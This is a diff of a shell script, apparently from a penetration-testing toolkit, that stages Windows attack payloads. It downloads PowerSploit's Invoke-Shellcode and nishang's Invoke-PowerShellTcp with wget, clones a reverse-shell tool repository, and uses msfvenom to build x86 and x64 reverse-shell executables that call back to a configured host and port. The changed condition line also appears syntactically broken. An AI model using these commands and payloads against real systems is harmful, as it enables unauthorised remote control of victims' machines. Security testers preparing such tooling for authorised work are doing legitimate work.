@@ -1,8 +1,8 @@
 mkdir public/payloads_windows
 cd public/payloads_windows
 
-   wget -Nq https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1
-   wget -Nq https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+   wget -N https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1
+   wget -N https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 
    if [ ! -d "Simple Reverse Shell" ]; then
       git clone --depth=1 --recursive https://github.com/infoskirmish/Window-Tools.git
@@ -11,7 +11,7 @@ cd public/payloads_windows
       rm -rf Window-Tools
    fi
 
-   if confirm "Regenerate payloads_windows [y/n]? "; then
+   if [ ! -f shell_reverse_tcp_x86.exe || confirm "Regenerate payloads_windows [y/n]? " ]; then
       # Reverse shells
       msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -o shell_reverse_tcp_x86.exe
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -o shell_reverse_tcp_x64.exe
